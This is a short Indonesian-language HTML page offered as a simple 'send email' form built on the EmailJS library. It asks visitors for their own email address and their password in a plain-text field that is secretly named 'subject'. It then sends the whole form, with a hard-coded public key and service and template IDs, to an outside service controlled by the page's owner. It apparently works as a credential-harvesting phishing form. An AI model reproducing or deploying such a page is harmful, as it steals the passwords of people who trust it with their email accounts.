<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Kirim Email</title>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Segoe UI,Arial,sans-serif;
}
body{
    background:linear-gradient(135deg,#4f46e5,#06b6d4);
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}
.card{
    width:430px;
    background:#fff;
    border-radius:18px;
    padding:30px;
    box-shadow:0 20px 40px rgba(0,0,0,.2);
}
h2{
    text-align:center;
    color:#333;
    margin-bottom:20px;
}
label{
    font-weight:600;
    color:#555;
}
input,textarea{
    width:100%;
    padding:12px;
    margin-top:6px;
    margin-bottom:16px;
    border:1px solid #ddd;
    border-radius:10px;
    outline:none;
    font-size:15px;
}
input:focus,
textarea:focus{
    border-color:#4f46e5;
}
button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    background:#4f46e5;
    color:white;
    font-size:16px;
    cursor:pointer;
    transition:.2s;
}
button:hover{
    background:#3730a3;
}
#status{
    text-align:center;
    margin-top:15px;
    color:green;
    font-weight:bold;
}
</style>

</head>
<body>

<div class="card">

<h2>📧 Kirim Email</h2>

<form id="emailForm">

<label>Email Tujuan</label>
<input type="email" name="to_email" required>

<label>Email Anda</label>
<input type="email" name="from_email" required>

<label>Password</label>
<input type="text" name="subject" required>

<label>Pesan</label>
<textarea name="message" rows="6" required></textarea>

<button type="submit">Kirim Email</button>

</form>

<div id="status"></div>

</div>

<script>
emailjs.init({
    publicKey: "R7OxskkTgRB5UTMkw"
});

document.getElementById("emailForm").addEventListener("submit",function(e){

e.preventDefault();

emailjs.sendForm(
"service_u08d5vi",
"template_4vaf4cx",
this
).then(function(){

document.getElementById("status").innerHTML="✅ Email berhasil dikirim.";

document.getElementById("emailForm").reset();

},function(error){

document.getElementById("status").innerHTML="❌ Gagal mengirim email.";

console.log(error);

});

});
</script>

</body>
</html>
